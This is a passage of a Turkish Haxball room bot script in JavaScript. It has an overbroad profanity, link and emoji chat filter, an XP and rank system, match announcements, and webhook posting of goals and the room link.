||message.includes("霽") ||message.includes("椣") ||message.includes("䖎") ||message.includes("蘗") ||message.includes("徠")||message.includes("oç") ||message.includes("oc") ||message.includes("yarrak") ||message.includes("anan") ||message.includes("baban") ||message.includes("sıcarım") ||message.includes("allan") ||message.includes("allahın") ||message.includes("kardeşini") ||message.includes("got") ||message.includes("göt") ||message.includes("meme") ||message.includes("çük") ||message.includes("cük") ||message.includes("an4l") ||message.includes("sik") ||message.includes("porn") ||message.includes("sex") ||message.includes("s3x") ||message.includes("p0rn") ||message.includes("boşal") ||message.includes("yavşak") ||message.includes("yavsak") ||message.includes("pezevenk") ||message.includes("piç") ||message.includes("pic") ||message.includes("orosbu") ||message.includes("orospu") ||message.includes("orosub") ||message.includes("orosup") ||message.includes("anneni") ||message.includes("ibne") ||message.includes("biçerim") ||message.includes("salak") ||message.includes("aptal") ||message.includes("deli") ||message.includes("idiot") ||message.includes("maymun") ||message.includes("allah belanı") ||message.includes("allah cezanı") ||message.includes("avrad") ||message.includes("angut") ||message.includes("azdım") ||message.includes("azgın") ||message.includes("sg") ||message.includes("beyinsiz") ||message.includes("cahil") ||message.includes("döl") ||message.includes("karı") ||message.includes("kahpe") ||message.includes("sokarım") ||message.includes("ezik") ||message.includes("manyak") ||message.includes("bacını")|message.includes("ebeni") ||message.includes("taşak") ||message.includes("taşşak") ||message.includes("tasak") ||message.includes("tassak") ||message.includes("yarrağı") ||message.includes("yarağı") ||message.includes("yarak") ||message.includes("taşşağı") ||message.includes("taşağı") ||message.includes("tassağı") ||message.includes("tasağı") ||message.includes("dkerim") ||message.includes("orul") ||message.includes("fuck") ||message.includes("gerizekalı") ||message.includes("ağzını") ||message.includes("çeneni") ||message.includes("hsktr") ||message.includes("işerim") ||message.includes("sıçarım") ||message.includes("feryadı")||message.includes("skerim")||message.includes("anneini")||message.includes("aq")||message.includes("awk") ||message.includes("mq") ||message.includes("özürlü") ||message.includes("peygamber") ||message.includes("sıkerım") ||message.includes("tecavüz") ||message.includes("pıttık") ||message.includes("pıttığın") ||message.includes("amcık") ||message.includes("amın") ||message.includes("anain")||message.includes("skm")||message.includes("sıkım")||message.includes("skcm")||message.includes("penis")||message.includes("https://")||message.includes("http://")||message.includes("www")||message.includes("com")||message.includes("org")||message.includes(".tr.gg")||message.includes(".tr")||message.includes(".us")||message.includes(".pro")||message.includes("amk")||message.includes("siktir") ||message.includes("sikcem") ||message.includes("sikeyim") ||message.includes("sikiyim") ||message.includes("sikiş") ||message.includes("skcem") ||message.includes("sikcm") ||message.includes("amuna") ||message.includes("sker") ||message.includes("siker") ||message.includes("sikler")||message.includes(".ç")||message.includes(".c")||message.includes("eşşek")||message.includes("amıc")||message.includes("amcı")||message.includes("amci")||message.includes("amic")||message.includes("amcik")||message.includes("amini")||message.includes("sikerim")||message.includes("SİKERİM")||message.includes("SIKERIM")||message.includes("ALLAHINI")||message.includes("kızını")||message.includes("BİÇERİM")||message.includes("siq")||message.includes("s*k")||message.includes("çutur")||message.includes("anayı")||message.includes("öç")||message.includes("o.c")||message.includes("o.ç")||message.includes("s1k3r")||message.includes("s1ker")||message.includes("andaval")||message.includes("obez")||message.includes("şizofren")||message.includes("annesiz")||message.includes("m4l")||message.includes("malll")||message.includes("0c")||message.includes("0ç")||message.includes("0rospu")||message.includes("0r0spu")||message.includes("or0spu")||message.includes("0rusbu")||message.includes("0ruspu")||message.includes("şerefsiz")||message.includes("ş3r3fsiz")||message.includes("yarram")||message.includes("yarraam")||message.includes("yarrağım")||message.includes("0ruspu")||message.includes("amım")||message.includes("a.q")||message.includes("a.mk")||message.includes("a.m.k")||message.includes("s.g")||message.includes("s.q")||message.includes("daşşa")||message.includes("taşşa")||message.includes("vajina")||message.includes("SİKEYİM")||message.includes("s**k")||message.includes("s***k")||message.includes("s****")||message.includes("s*")||message.includes("o,")||message.includes("o.")||message.includes("s.")||message.includes("s,")||message.includes("4n4l")||message.includes("4nal")||message.includes("😀")||message.includes("😃")||message.includes("😄")||message.includes("😁")||message.includes("😆")||message.includes("😅")||message.includes("😂")||message.includes("🤣")||message.includes("🥲")||message.includes("🥹")||message.includes("☺️")||message.includes("😊")||message.includes("😇")||message.includes("🙂")||message.includes("🙃")||message.includes("😉")||message.includes("😌")||message.includes("😍")||message.includes("🥰")||message.includes("😘")||message.includes("😗")||message.includes("😙")||message.includes("😚")||message.includes("😋")||message.includes("😛")||message.includes("😝")||message.includes("😜")||message.includes("🤪")||message.includes("🤨")||message.includes("🧐")||message.includes("🤓")||message.includes("😎")||message.includes("🥸")||message.includes("🤩")||message.includes("🥳")||message.includes("😏")||message.includes("😒")||message.includes("😞")||message.includes("😔")||message.includes("😟")||message.includes("😕")||message.includes("🙁")||message.includes("☹️")||message.includes("😣")||message.includes("😖")||message.includes("😫")||message.includes("😩")||message.includes("🥺")||message.includes("😢")||message.includes("😭")||message.includes("😮‍💨")||message.includes("😤")||message.includes("😠")||message.includes("😡")||message.includes("🤬")||message.includes("🤯")||message.includes("😳")||message.includes("🥵")||message.includes("🥶")||message.includes("😱")||message.includes("😨")||message.includes("😰")||message.includes("😥")||message.includes("😓")||message.includes("🫣")||message.includes("🤗")||message.includes("🫡")||message.includes("🤔")||message.includes("🫢")||message.includes("🤭")||message.includes("🤫")||message.includes("🤥")||message.includes("😶")||message.includes("😶‍🌫️")||message.includes("😐")||message.includes("😑")||message.includes("😬")||message.includes("🫨")||message.includes("🫠")||message.includes("🙄")||message.includes("😯")||message.includes("😦")||message.includes("😧")||message.includes("😮")||message.includes("😲")||message.includes("🥱")||message.includes("😴")||message.includes("🤤")||message.includes("😪")||message.includes("😵")||message.includes("😵‍💫")||message.includes("🫥")||message.includes("🤐")||message.includes("🥴")||message.includes("🤢")||message.includes("🤮")||message.includes("🤧")||message.includes("😷")||message.includes("🤒")||message.includes("🤕")||message.includes("🤑")||message.includes("🤠")||message.includes("😈")||message.includes("👿")||message.includes("👹")||message.includes("👺")||message.includes("🤡")||message.includes("💩")||message.includes("👻")||message.includes("💀")||message.includes("☠️")||message.includes("👽")||message.includes("👾")||message.includes("🤖")||message.includes("🎃")||message.includes("😺")||message.includes("😸")||message.includes("😹")||message.includes("😻")||message.includes("😼")||message.includes("😽")||message.includes("🙀")||message.includes("😿")||message.includes("😾")||message.includes("👋")||message.includes("🤚")||message.includes("🖐")||message.includes("✋")||message.includes("🖖")||message.includes("👌")||message.includes("🤌")||message.includes("🤏")||message.includes("✌️")||message.includes("🤞")||message.includes("🫰")||message.includes("🤟")||message.includes("🤘")||message.includes("🤙")||message.includes("🫵")||message.includes("🫱")||message.includes("🫲")||message.includes("🫸")||message.includes("🫷")||message.includes("🫳")||message.includes("🫴")||message.includes("👈")||message.includes("👉")||message.includes("👆")||message.includes("🖕")||message.includes("👇")||message.includes("☝️")||message.includes("👍")||message.includes("👎")||message.includes("✊")||message.includes("👊")||message.includes("🤛")||message.includes("🤜")||message.includes("👏")||message.includes("🫶")||message.includes("🙌")||message.includes("👐")||message.includes("🤲")||message.includes("🤝")||message.includes("🙏")||message.includes("✍️")||message.includes("💅")||message.includes("🤳")||message.includes("💪")||message.includes("🦾")||message.includes("🦵")||message.includes("🦿")||message.includes("🦶")||message.includes("👣")||message.includes("👂")||message.includes("🦻")||message.includes("👃")||message.includes("🫀")||message.includes("🫁")||message.includes("🧠")||message.includes("🦷")||message.includes("🦴")||message.includes("👀")||message.includes("👁")||message.includes("👅")||message.includes("👄")||message.includes("🫦")||message.includes("💋")||message.includes("🩸")||message.includes("👶")||message.includes("👧")||message.includes("🧒")||message.includes("👦")||message.includes("👩")||message.includes("🧑")||message.includes("👨")||message.includes("👩‍🦱")||message.includes("🧑‍🦱")||message.includes("👨‍🦱")||message.includes("👩‍🦰")||message.includes("🧑‍🦰")||message.includes("👨‍🦰")||message.includes("👱‍♀️")||message.includes("👱")||message.includes("👱‍♂️")||message.includes("👩‍🦳")||message.includes("🧑‍🦳")||message.includes("👨‍🦳")||message.includes("👩‍🦲")||message.includes("🧑‍🦲")||message.includes("👨‍🦲")||message.includes("🧔‍♀️")||message.includes("🧔")||message.includes("🧔‍♂️")||message.includes("👵")||message.includes("🧓")||message.includes("👴")||message.includes("👲")||message.includes("👳‍♀️")||message.includes("👳")||message.includes("👳‍♂️")||message.includes("🧕")||message.includes("👮‍♀️")||message.includes("👮")||message.includes("👮‍♂️")||message.includes("👷‍♀️")||message.includes("👷")||message.includes("👷‍♂️")||message.includes("💂‍♀️")||message.includes("💂")||message.includes("💂‍♂️")||message.includes("🕵️‍♀️")||message.includes("🕵️")||message.includes("🕵️‍♂️")||message.includes("👩‍⚕️")||message.includes("🧑‍⚕️")||message.includes("👨‍⚕️")||message.includes("👩‍🌾")||message.includes("🧑‍🌾")||message.includes("👨‍🌾")||message.includes("👩‍🍳")||message.includes("🧑‍🍳")||message.includes("👨‍🍳")||message.includes("👩‍🎓")||message.includes("🧑‍🎓")||message.includes("👨‍🎓")||message.includes("👩‍🎤")||message.includes("🧑‍🎤")||message.includes("👨‍🎤")||message.includes("👩‍🏫")||message.includes("🧑‍🏫")||message.includes("👨‍🏫")||message.includes("👩‍🏭")||message.includes("🧑‍🏭")||message.includes("👨‍🏭")||message.includes("👩‍💻")||message.includes("🧑‍💻")||message.includes("👨‍💻")||message.includes("👩‍💼")||message.includes("🧑‍💼")||message.includes("👨‍💼")||message.includes("👩‍🔧")||message.includes("🧑‍🔧")||message.includes("👨‍🔧")||message.includes("👩‍🔬")||message.includes("🧑‍🔬")||message.includes("👨‍🔬")||message.includes("👩‍🎨")||message.includes("🧑‍🎨")||message.includes("👨‍🎨")||message.includes("👩‍🚒")||message.includes("🧑‍🚒")||message.includes("👨‍🚒")||message.includes("👩‍✈️")||message.includes("🧑‍✈️")||message.includes("👨‍✈️")||message.includes("👩‍🚀")||message.includes("🧑‍🚀")||message.includes("👨‍🚀")||message.includes("👩‍⚖️")||message.includes("🧑‍⚖️")||message.includes("👨‍⚖️")||message.includes("👰‍♀️")||message.includes("👰")||message.includes("👰‍♂️")||message.includes("🤵‍♀️")||message.includes("🤵")||message.includes("🤵‍♂️")||message.includes("👸")||message.includes("🫅")||message.includes("🤴")||message.includes("🥷")||message.includes("🦸‍♀️")||message.includes("🦸")||message.includes("🦸‍♂️")||message.includes("🦹‍♀️")||message.includes("🦹")||message.includes("🦹‍♂️")||message.includes("🤶")||message.includes("🧑‍🎄")||message.includes("🎅")||message.includes("🧙‍♀️")||message.includes("🧙")||message.includes("🧙‍♂️")||message.includes("🧝‍♀️")||message.includes("🧝")||message.includes("🧝‍♂️")||message.includes("🧛‍♀️")||message.includes("🧛")||message.includes("🧛‍♂️")||message.includes("🧟‍♀️")||message.includes("🧟")||message.includes("🧟‍♂️")||message.includes("🧞‍♀️")||message.includes("🧞")||message.includes("🧞‍♂️")||message.includes("🧜‍♀️")||message.includes("🧜")||message.includes("🧜‍♂️")||message.includes("🧚‍♀️")||message.includes("🧚")||message.includes("🧚‍♂️")||message.includes("🧌")||message.includes("👼")||message.includes("🤰")||message.includes("🫄")||message.includes("🫃")||message.includes("🤱")||message.includes("👩‍🍼")||message.includes("🧑‍🍼")||message.includes("👨‍🍼")||message.includes("🙇‍♀️")||message.includes("🙇")||message.includes("🙇‍♂️")||message.includes("💁‍♀️")||message.includes("💁")||message.includes("💁‍♂️")||message.includes("🙅‍♀️")||message.includes("🙅")||message.includes("🙅‍♂️")||message.includes("🙆‍♀️")||message.includes("🙆")||message.includes("🙆‍♂️")||message.includes("🙋‍♀️")||message.includes("🙋")||message.includes("🙋‍♂️")||message.includes("🧏‍♀️")||message.includes("🧏")||message.includes("🧏‍♂️")||message.includes("🤦‍♀️")||message.includes("🤦")||message.includes("🤦‍♂️")||message.includes("🤷‍♀️")||message.includes("🤷")||message.includes("🤷‍♂️")||message.includes("🙎‍♀️")||message.includes("🙎")||message.includes("🙎‍♂️")||message.includes("🙍‍♀️")||message.includes("🙍")||message.includes("🙍‍♂️")||message.includes("💇‍♀️")||message.includes("💇")||message.includes("💇‍♂️")||message.includes("💆‍♀️")||message.includes("💆")||message.includes("💆‍♂️")||message.includes("🧖‍♀️")||message.includes("🧖")||message.includes("🧖‍♂️")||message.includes("💅")||message.includes("🤳")||message.includes("💃")||message.includes("🕺")||message.includes("👯‍♀️")||message.includes("👯")||message.includes("👯‍♂️")||message.includes("🕴")||message.includes("👩‍🦽")||message.includes("🧑‍🦽")||message.includes("👨‍🦽")||message.includes("👩‍🦼")||message.includes("🧑‍🦼")||message.includes("👨‍🦼")||message.includes("🚶‍♀️")||message.includes("🚶")||message.includes("🚶‍♂️")||message.includes("👩‍🦯")||message.includes("🧑‍🦯")||message.includes("👨‍🦯")||message.includes("🧎‍♀️")||message.includes("🧎")||message.includes("🧎‍♂️")||message.includes("🏃‍♀️")||message.includes("🏃")||message.includes("🏃‍♂️")||message.includes("🧍‍♀️")||message.includes("🧍")||message.includes("🧍‍♂️")||message.includes("👭")||message.includes("🧑‍🤝‍🧑")||message.includes("👬")||message.includes("👫")||message.includes("👩‍❤️‍👩")||message.includes("💑")||message.includes("👨‍❤️‍💋‍👨")||message.includes("👩‍❤️‍💋‍👨")||message.includes("👩‍❤️‍👨")||message.includes("👩‍❤️‍👩")||message.includes("👨‍❤️‍👨")||message.includes("👩‍❤️‍👨")||message.includes("👪")||message.includes("👨‍👩‍👦")||message.includes("👨‍👩‍👧")||message.includes("👨‍👩‍👧‍👦")||message.includes("👨‍👩‍👦‍👦")||message.includes("👨‍👩‍👧‍👧")||message.includes("👨‍👨‍👦")||message.includes("👨‍👨‍👧")||message.includes("👨‍👨‍👧‍👦")||message.includes("👨‍👨‍👦‍👦")||message.includes("👨‍👨‍👧‍👧")||message.includes("👩‍👩‍👦")||message.includes("👩‍👩‍👧")||message.includes("👩‍👩‍👧‍👦")||message.includes("👩‍👩‍👦‍👦")||message.includes("👩‍👩‍👧‍👧")||message.includes("👨‍👦")||message.includes("👨‍👦‍👦")||message.includes("👨‍👧")||message.includes("👨‍👧‍👦")||message.includes("👨‍👧‍👧")||message.includes("👩‍👦")||message.includes("👩‍👦‍👦")||message.includes("👩‍👧")||message.includes("👩‍👧‍👦")||message.includes("👩‍👧‍👧")||message.includes("🗣")||message.includes("👤")||message.includes("👥")||message.includes("🫂")||message.includes("🧳")||message.includes("🌂")||message.includes("☂️")||message.includes("🧵")||message.includes("🪡")||message.includes("🪢")||message.includes("🪭")||message.includes("🧶")||message.includes("👓")||message.includes("🕶")||message.includes("🥽")||message.includes("🥼")||message.includes("🦺")||message.includes("👔")||message.includes("👕")||message.includes("👖")||message.includes("🧣")||message.includes("🧤")||message.includes("🧥")||message.includes("🧦")||message.includes("👗")||message.includes("👘")||message.includes("🥻")||message.includes("🩴")||message.includes("🩱")||message.includes("🩲")||message.includes("🩳")||message.includes("👙")||message.includes("👚")||message.includes("👛")||message.includes("👜")||message.includes("👝")||message.includes("🎒")||message.includes("👞")||message.includes("👟")||message.includes("🥾")||message.includes("🥿")||message.includes("👠")||message.includes("👡")||message.includes("🩰")||message.includes("👢")||message.includes("👑")||message.includes("👒")||message.includes("🎩")||message.includes("🎓")||message.includes("🧢")||message.includes("⛑")||message.includes("🪖")||message.includes("💄")||message.includes("💍")||message.includes("💼")||message.includes("🐶")||message.includes("🐱")||message.includes("🐭")||message.includes("🐹")||message.includes("🐰")||message.includes("🦊")||message.includes("🐻")||message.includes("🐼")||message.includes("🐻‍❄️")||message.includes("🐨")||message.includes("🐯")||message.includes("🦁")||message.includes("🐮")||message.includes("🐷")||message.includes("🐽")||message.includes("🐸")||message.includes("🐵")||message.includes("🙈")||message.includes("🙉")||message.includes("🙊")||message.includes("🐒")||message.includes("🐔")||message.includes("🐧")||message.includes("🐦")||message.includes("🐦‍⬛")||message.includes("🐤")||message.includes("🐣")||message.includes("🐥")||message.includes("🦆")||message.includes("🦅")||message.includes("🦉")||message.includes("🦇")||message.includes("🐺")||message.includes("🐗")||message.includes("🐴")||message.includes("🦄")||message.includes("🐝")||message.includes("🪱")||message.includes("🐛")||message.includes("🦋")||message.includes("🐌")||message.includes("🐞")||message.includes("🐜")||message.includes("🪰")||message.includes("🪲")||message.includes("🪳")||message.includes("🦟")||message.includes("🦗")||message.includes("🕷")||message.includes("🕸")||message.includes("🦂")||message.includes("🐢")||message.includes("🐍")||message.includes("🦎")||message.includes("🦖")||message.includes("🦕")||message.includes("🐙")||message.includes("🦑")||message.includes("🦐")||message.includes("🦞")||message.includes("🦀")||message.includes("🪼")||message.includes("🪸")||message.includes("🐡")||message.includes("🐠")||message.includes("🐟")||message.includes("🐬")||message.includes("🐳")||message.includes("🐋")||message.includes("🦈")||message.includes("🐊")||message.includes("🐅")||message.includes("🐆")||message.includes("🦓")||message.includes("🫏")||message.includes("🦍")||message.includes("🦧")||message.includes("🦣")||message.includes("🐘")||message.includes("🦛")||message.includes("🦏")||message.includes("🐪")||message.includes("🐫")||message.includes("🦒")||message.includes("🦘")||message.includes("🦬")||message.includes("🐃")||message.includes("🐂")||message.includes("🐄")||message.includes("🐎")||message.includes("🐖")||message.includes("🐏")||message.includes("🐑")||message.includes("🦙")||message.includes("🐐")||message.includes("🦌")||message.includes("🫎")||message.includes("🐕")||message.includes("🐩")||message.includes("🦮")||message.includes("🐕‍🦺")||message.includes("🐈")||message.includes("🐈‍⬛")||message.includes("🪽")||message.includes("🪶")||message.includes("🐓")||message.includes("🦃")||message.includes("🦤")||message.includes("🦚")||message.includes("🦜")||message.includes("🦢")||message.includes("🪿")||message.includes("🦩")||message.includes("🕊")||message.includes("🐇")||message.includes("🦝")||message.includes("🦨")||message.includes("🦡")||message.includes("🦫")||message.includes("🦦")||message.includes("🦥")||message.includes("🐁")||message.includes("🐀")||message.includes("🐿")||message.includes("🦔")||message.includes("🐾")||message.includes("🐉")||message.includes("🐲")||message.includes("🌵")||message.includes("🎄")||message.includes("🌲")||message.includes("🌳")||message.includes("🌴")||message.includes("🪹")||message.includes("🪺")||message.includes("🪵")||message.includes("🌱")||message.includes("🌿")||message.includes("☘️")||message.includes("🍀")||message.includes("🎍")||message.includes("🪴")||message.includes("🎋")||message.includes("🍃")||message.includes("🍂")||message.includes("🍁")||message.includes("🍄")||message.includes("🐚")||message.includes("🪨")||message.includes("🌾")||message.includes("💐")||message.includes("🌷")||message.includes("🪷")||message.includes("🌹")||message.includes("🥀")||message.includes("🌺")||message.includes("🌸")||message.includes("🪻")||message.includes("🌼")||message.includes("🌻")||message.includes("🌞")||message.includes("🌝")||message.includes("🌛")||message.includes("🌜")||message.includes("🌚")||message.includes("🌕")||message.includes("🌖")||message.includes("🌗")||message.includes("🌘")||message.includes("🌑")||message.includes("🌒")||message.includes("🌓")||message.includes("🌔")||message.includes("🌙")||message.includes("🌎")||message.includes("🌍")||message.includes("🌏")||message.includes("🪐")||message.includes("💫")||message.includes("⭐️")||message.includes("🌟")||message.includes("✨")||message.includes("⚡️")||message.includes("☄️")||message.includes("💥")||message.includes("🔥")||message.includes("🌪")||message.includes("🌈")||message.includes("☀️")||message.includes("🌤")||message.includes("⛅️")||message.includes("🌥")||message.includes("☁️")||message.includes("🌦")||message.includes("🌧")||message.includes("⛈")||message.includes("🌩")||message.includes("🌨")||message.includes("❄️")||message.includes("☃️")||message.includes("⛄️")||message.includes("🌬")||message.includes("💨")||message.includes("💧")||message.includes("💦")||message.includes("🫧")||message.includes("☔️")||message.includes("☂️")||message.includes("🌊")||message.includes("🌫")) { // "oç" kelimesi mesajın içinde bulunursa
        // Küfür içeren mesajı gönderen oyuncuyu uyar
        room.sendAnnouncement(player.name + ', ' + 'ᴀʀɢᴏ / ᴋᴜғᴜʀ ᴀʟɢɪʟᴀɴᴅɪ, ᴍᴇsᴀᴊ ᴇɴɢᴇʟʟᴇɴᴅɪ.' + ' ' + 'İD: ' + player.id + ' ', null, 0xFFFF00);
        room.sendAnnouncement(player.name + ": " + message + " (⚠️ ᴀʀɢᴏ / ᴋᴜғᴜʀ ꜱᴜᴘʜᴇꜱɪ, ꜱᴀᴅᴇᴄᴇ 𝘼𝘿𝙈𝙄𝙉'ʟᴇʀ ɢᴏʀᴇᴄᴇᴋ)", player.id, 0xFFFF00, 'bold');
        for (var a = 0; a < players.length; a++) {
            if (players[a].admin === true) {
        room.sendAnnouncement(player.name + ": " + message + " (⚠️ ᴀʀɢᴏ / ᴋᴜғᴜʀ ꜱᴜᴘʜᴇꜱɪ, ꜱᴀᴅᴇᴄᴇ 𝘼𝘿𝙈𝙄𝙉'ʟᴇʀ ɢᴏʀᴇᴄᴇᴋ)", players[a].id, 0xFFFF00, 'bold');
            }
        }
        return false;
    }
if (player) {
    var playerName = player.name;
    initializeXP(playerName);
    var playerXP = getXP(playerName);
    var playerLevel = getLevel(playerXP);

    initializePoints(playerName);
    var playerPoints = getPoints(playerName);
    var playerRank = getRank(playerPoints);
    var rankEmoji = getRankEmoji(playerRank); // Rankın emojisini al

    room.sendAnnouncement(`${rankEmoji} 𝐋𝐕𝐋 ${playerLevel} | ${player.name}: ${message}`, null);
    return false;
    }
};

function getRankEmoji(rank) {
    switch (rank) {
        case '🦴 Unranked':
            return '🦴'; // Unranked için özel emoji
        case '🟤 Bronz':
            return '🟤'; // Bronz için özel emoji
        case '⚪ Silver':
            return '⚪'; // Silver için özel emoji
        case '🟡 Gold':
            return '🟡'; // Gold için özel emoji
        case '🟣 Platinum':
            return '🟣'; // Platinum için özel emoji
        case '💎 Diamond':
            return '💎'; // Diamond için özel emoji
        case '🔰 Challenger':
            return '🔰'; // Challenger için özel emoji
        case '💫 Legendary':
            return '💫'; // Legendary için özel emoji
        case '🕊️ Icon':
            return '🕊️'; // Icon için özel emoji
        case '🐐 GOAT':
            return '🐐'; // GOAT için özel emoji
        default:
            return rank;
    }
}

room.onPlayerActivity = function (player) {
    if (gameState !== State.STOP) {
        let pComp = getPlayerComp(player);
        if (pComp != null) pComp.inactivityTicks = 0;
    }
};

room.onPlayerBallKick = function (player) {
        var responses = ['İnanılmaz bir vuruş!', 'Füze yolluyor!', 'Roket gönderiyor!', 'Sert bir şut!', 'Bir şut!', 'Sağlam vuruş!', 'Gelişine Vuruş!', 'Sert bir top yolluyor!'];
        var sozlerburada = responses[Math.floor(Math.random() * responses.length)];
        var responses = ['0xFF0000', '0x00FF00', '0xe80000', '0xdb00eb', '0x00e0d1', '0xe6de00', '0xe68600', '0xfc54ff', '0x007dfa', '0xffffff'];
        var renkistee = responses[Math.floor(Math.random() * responses.length)];

	if(oynanabilir == true){
		if(powerActive == true){
    room.setDiscProperties(0,{xspeed:PowerCoefficient * room.getDiscProperties(0).xspeed,yspeed:PowerCoefficient * room.getDiscProperties(0).yspeed});
room.sendAnnouncement(player.name + " " + sozlerburada, null, renkistee, "bold");
    powerActive = false;
    }}
  if (isVIP[player.id]) {
        var responses = ["0x000000", "0x00ffdd", "0xff00d9", "0x1eff00", "0xff6a00", "0x05008c", "0xffffff", "0x808080", "0xe5ff00", "0xff0099"];
        var randomResponse = responses[Math.floor(Math.random() * responses.length)];
  room.setDiscProperties(0, {color: randomResponse});
  }
if (!isVIP[player.id]) {
    room.setDiscProperties(0, { color: 0xffcc00 });
  }
    //room.sendAnnouncement(player.name + " Bir şut!", null, 0xFF0000, "bold");
    if (playSituation != Situation.GOAL) {
        var ballPosition = room.getBallPosition();
        if (game.touchArray.length == 0 || player.id != game.touchArray[game.touchArray.length - 1].player.id) {
            if (playSituation == Situation.KICKOFF) playSituation = Situation.PLAY;
            lastTeamTouched = player.team;
            game.touchArray.push(
                new BallTouch(
                    player,
                    game.scores.time,
                    getGoalGame(),
                    ballPosition
                )
            );
            lastTouches[0] = checkGoalKickTouch(
                game.touchArray,
                game.touchArray.length - 1,
                getGoalGame()
            );
            lastTouches[1] = checkGoalKickTouch(
                game.touchArray,
                game.touchArray.length - 2,
                getGoalGame()
            );
        }
    }
};

/* GAME MANAGEMENT */


room.onGameStart = function (byPlayer) {
        var responses = ['0xF6FF43', '0x00ffd5', '0xbfff50', '0xffd050'];
        var GeneradorColoresRandom = responses[Math.floor(Math.random() * responses.length)];
  room.sendAnnouncement("🎬 Maç kaydı başladı!", null, 0xFFFFFF, "bold");
    room.sendAnnouncement("   🏆    M A Ç   K A R Ş I L A Ş M A S I  :       KIRMIZI   vs   MAVİ", null, GeneradorColoresRandom, "normal");
    room.sendAnnouncement("   Kullanılabilir komutları görmek için !komutlar yazın.", null, GeneradorColoresRandom, "normal");    
    clearTimeout(startTimeout);
    if (byPlayer != null) clearTimeout(stopTimeout);
    game = new Game();
    possession = [0, 0];
    actionZoneHalf = [0, 0];
    gameState = State.PLAY;
    endGameVariable = false;
    goldenGoal = false;
    playSituation = Situation.KICKOFF;
    lastTouches = Array(2).fill(null);
    lastTeamTouched = Team.SPECTATORS;
    teamRedStats = [];
    teamBlueStats = [];
    if (teamRed.length == teamSize && teamBlue.length == teamSize) {
        for (var i = 0; i < teamSize; i++) {
            teamRedStats.push(teamRed[i]);
            teamBlueStats.push(teamBlue[i]);
        }
    }
    calculateStadiumVariables();
};
var assistingTouch = "";
var lastPlayerTouched = "";
room.onGameStop = function (byPlayer) {
     lastPlayerTouched = "";
    clearTimeout(stopTimeout);
    clearTimeout(unpauseTimeout);
    if (byPlayer != null) clearTimeout(startTimeout);
    game.rec = room.stopRecording();
    if (
        !cancelGameVariable && game.playerComp[0].length + game.playerComp[1].length > 0 &&
        (
            (game.scores.timeLimit != 0 &&
                ((game.scores.time >= 0.5 * game.scores.timeLimit &&
                    game.scores.time < 0.75 * game.scores.timeLimit &&
                    game.scores.red != game.scores.blue) ||
                    game.scores.time >= 0.75 * game.scores.timeLimit)
            ) ||
            endGameVariable
        )
    ) {
        fetchSummaryEmbed(game);
        if (fetchRecordingVariable) {
            setTimeout((gameEnd) => { fetchRecording(gameEnd); }, 500, game);
        }
    }
    cancelGameVariable = false;
    gameState = State.STOP;
    playSituation = Situation.STOP;
    updateTeams();
    handlePlayersStop(byPlayer);
    handleActivityStop();
};

room.onGamePause = function (byPlayer) {
    if (mentionPlayersUnpause && gameState == State.PAUSE) {
        if (byPlayer != null) {
            room.sendAnnouncement(
                `Oyunu Durduran: ${byPlayer.name} !`,
                null,
                defaultColor,
                'bold',
                HaxNotification.NONE
            );
        } else {
            room.sendAnnouncement(
                `Oyun Durdu !`,
                null,
                defaultColor,
                'bold',
                HaxNotification.NONE
            );
        }
    }
    clearTimeout(unpauseTimeout);
    gameState = State.PAUSE;
};

room.onGameUnpause = function (byPlayer) {
    unpauseTimeout = setTimeout(() => {
        gameState = State.PLAY;
    }, 2000);
    if (mentionPlayersUnpause) {
        if (byPlayer != null) {
            room.sendAnnouncement(
                `Oyunu Durduran: ${byPlayer.name} !`,
                null,
                defaultColor,
                'bold',
                HaxNotification.NONE
            );
        } else {
            room.sendAnnouncement(
                `Oyun Devam Ediyor !`,
                null,
                defaultColor,
                'bold',
                HaxNotification.NONE
            );
        }
    }
    if (
        (teamRed.length == teamSize && teamBlue.length == teamSize && chooseMode) ||
        (teamRed.length == teamBlue.length && teamSpec.length < 2 && chooseMode)
    ) {
        deactivateChooseMode();
    }
};

room.onTeamGoal = function (team) {
    const scores = room.getScores();
    game.scores = scores;
    playSituation = Situation.GOAL;
    ballSpeed = getBallSpeed();
    var goalString = getGoalString(team);
    for (let player of teamRed) {
        var playerComp = getPlayerComp(player);
        team == Team.RED ? playerComp.goalsScoredTeam++ : playerComp.goalsConcededTeam++;
    }
    for (let player of teamBlue) {
        var playerComp = getPlayerComp(player);
        team == Team.BLUE ? playerComp.goalsScoredTeam++ : playerComp.goalsConcededTeam++;
    }
room.sendAnnouncement("┌────────────────────────────────────────────────────────┐", null, 0xb672ff, "small", 1)
    room.sendAnnouncement("   " +
        goalString,
        null,
        team == Team.RED ? redColor : blueColor,
        null,
        HaxNotification.CHAT
    );
room.sendAnnouncement("└────────────────────────────────────────────────────────┘", null, 0xb672ff, "small", 1)
    if (roomWebhook != '') {
        fetch(roomWebhook, {
            method: 'POST',
            body: JSON.stringify({
                content: `[${getDate()}] ${goalString}`,
                username: roomName,
            }),
            headers: {
                'Content-Type': 'application/json',
            },
        }).then((res) => res);
    }
    if ((scores.scoreLimit != 0 && (scores.red == scores.scoreLimit || scores.blue == scores.scoreLimit)) || goldenGoal) {
        endGame(team);
        goldenGoal = false;
        stopTimeout = setTimeout(() => {
            room.stopGame();
        }, 1000);
    }
};

room.onPositionsReset = function () {
    lastTouches = Array(2).fill(null);
    lastTeamTouched = Team.SPECTATORS;
    playSituation = Situation.KICKOFF;
};

/* MISCELLANEOUS */

room.onRoomLink = function (url) {
    console.log(`${url}\nmasterPassword : ${masterPassword}`);
    if (roomWebhook != '') {
        fetch(roomWebhook, {
            method: 'POST',
            body: JSON.stringify({
                content: `[${getDate()}] 🔗 LINK ${url}\nmasterPassword : ${masterPassword}`,
                username: roomName,
            }),
            headers: {
                'Content-Type': 'application/json',
            },
        }).then((res) => res);
    }
};

room.onPlayerAdminChange = function (changedPlayer, byPlayer) {
    updateTeams();
    if (!changedPlayer.admin && getRole(changedPlayer) >= Role.ADMIN_TEMP) {
        room.setPlayerAdmin(changedPlayer.id, true);
        return;
    }
    updateAdmins(byPlayer != null && !changedPlayer.admin && changedPlayer.id == byPlayer.id ? changedPlayer.id : 0);
};

room.onKickRateLimitSet = function (min, rate, burst, byPlayer) {
    if (byPlayer != null) {
        room.sendAnnouncement(
            `Kickrate limitinin değiştirilmesine izin verilmez. "6-0-0"da kalmalı.`,
            player.id,
            errorColor,
            'bold',
            HaxNotification.CHAT
        );
        room.setKickRateLimit(6, 0, 0);
    }
};

room.onStadiumChange = function (newStadiumName, byPlayer) {
    if (byPlayer !== null) {
